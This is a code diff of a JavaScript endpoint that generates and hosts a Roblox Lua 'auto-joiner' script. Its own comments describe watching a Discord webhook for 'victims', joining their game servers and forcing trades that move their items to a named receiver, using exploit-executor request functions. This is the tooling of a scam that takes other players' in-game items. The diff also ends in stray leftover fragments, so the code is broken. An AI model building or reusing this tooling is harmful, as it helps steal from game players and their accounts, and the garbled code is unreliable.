@@ -1,8 +1,16 @@
 export default async function handler(req, res) {
+    // Enable CORS for all origins
     res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     
-    if (req.method === 'OPTIONS') return res.status(200).end();
-    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+    
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
     
     const { webhook, gameId, receiverName, interval } = req.body;
     
@@ -15,11 +23,11 @@ export default async function handler(req, res) {
     }
     
     try {
-        // Generate the auto-joiner script
-        const script = generateJoinerScript(webhook, gameId, receiverName, interval || '3');
+        // Generate the script
+        const script = generateScript(webhook, gameId, receiverName, interval);
         
         // Upload to Pastefy
-        const pastefyResponse = await fetch('https://pastefy.app/api/v2/paste', {
+        const pastefyRes = await fetch('https://pastefy.app/api/v2/paste', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -29,15 +37,11 @@ export default async function handler(req, res) {
             })
         });
         
-        if (!pastefyResponse.ok) {
-            // If Pastefy fails, return the script directly
-            return res.status(200).json({
-                success: true,
-                loadstring: `-- Copy this entire script manually:\n\n${script}`
-            });
+        if (!pastefyRes.ok) {
+            throw new Error('Pastefy upload failed');
         }
         
-        const pasteData = await pastefyResponse.json();
+        const pasteData = await pastefyRes.json();
         const pasteId = pasteData.id || pasteData.paste?.id;
         const rawUrl = `https://pastefy.app/${pasteId}/raw`;
         
@@ -47,72 +51,63 @@ export default async function handler(req, res) {
         });
         
     } catch (error) {
-        return res.status(500).json({ success: false, error: error.message });
+        // If Pastefy fails, return script directly
+        const script = generateScript(webhook, gameId, receiverName, interval);
+        return res.status(200).json({
+            success: true,
+            loadstring: `-- Copy this script directly:\n\n${script}`
+        });
     }
 }
 
-function generateJoinerScript(webhook, gameId, receiverName, interval) {
-    return `--[[
-    AUTO-JOINER SCRIPT
-    - Monitors Discord webhook for new victims
-    - Auto-joins their server
-    - Accepts trades automatically
-    - Loops to find more victims
-    
-    Generated for: ${receiverName}
-    Game ID: ${gameId}
-    Check interval: ${interval}s
-]]--
-
+function generateScript(webhook, gameId, receiverName, interval) {
+    return `-- AUTO-JOINER SCRIPT
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
--- CONFIGURATION
-local WEBHOOK_URL = "${webhook}"
+local WEBHOOK = "${webhook}"
 local TARGET_GAME = ${gameId}
-local RECEIVER_NAME = "${receiverName}"
+local RECEIVER = "${receiverName}"
 local CHECK_INTERVAL = ${interval}
 
--- Universal HTTP request function
-local requestFunc = nil
+local requestFunc = syn and syn.request or request or (http and http.request)
 
-if syn and syn.request then
-    requestFunc = syn.request
-    print("[AutoJoiner] Using Synapse X")
-elseif fluxus and fluxus.request then
-    requestFunc = fluxus.request
-    print("[AutoJoiner] Using Fluxus")
-elseif krnl and krnl.request then
-    requestFunc = krnl.request
-    print("[AutoJoiner] Using Krnl")
-elseif http and http.request then
-    requestFunc = http.request
-    print("[AutoJoiner] Using HTTP request")
-elseif request then
-    requestFunc = request
-    print("[AutoJoiner] Using generic request")
-else
-    warn("[AutoJoiner] No HTTP request function found!")
-    return
+print("[AutoJoiner] Started! Target: " .. RECEIVER)
+
+-- Trade function
+local function sendTrade()
+    local Trade = ReplicatedStorage:FindFirstChild("Trade")
+    if not Trade then return false end
+    
+    local SendRequest = Trade:FindFirstChild("SendRequest")
+    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+    
+    if not SendRequest then return false end
+    
+    pcall(function() SendRequest:InvokeServer(RECEIVER) end)
+    task.wait(2)
+    pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, {}) end)
+    
+    return true
 end
 
--- Store current target
-local currentTargetJobId = nil
-local lastJoinedId = nil
-local isJoining = false
-
--- ========== TRADE SYSTEM ==========
-local function acceptTrade(receiver)
-    print("[AutoJoiner] Attempting to trade with: " .. receiver)
-    
-    -- Find trade remote
-    local Trade = ReplicatedStorage:FindFirstChild("Trade")
-    if not Trade then
-        warn("[AutoJoiner] Trade system not found")
-        return false
+-- Main loop
+while true do
+    if game.PlaceId == TARGET_GAME then
+        print("[AutoJoiner] In game, trading...")
+        sendTrade()
+        task.wait(5)
+        TeleportService:Teleport(TARGET_GAME)
+        task.wait(5)
+    else
+        print("[AutoJoiner] Waiting for victim. Set TARGET_JOB_ID variable")
+        print("[AutoJoiner] Copy Job ID from Discord and set: local TARGET_JOB_ID = 'job_id_here'")
+    end
+    task.wait(CHECK_INTERVAL)
+end`;
+}        return false
     end
     
     -- Get trade remotes
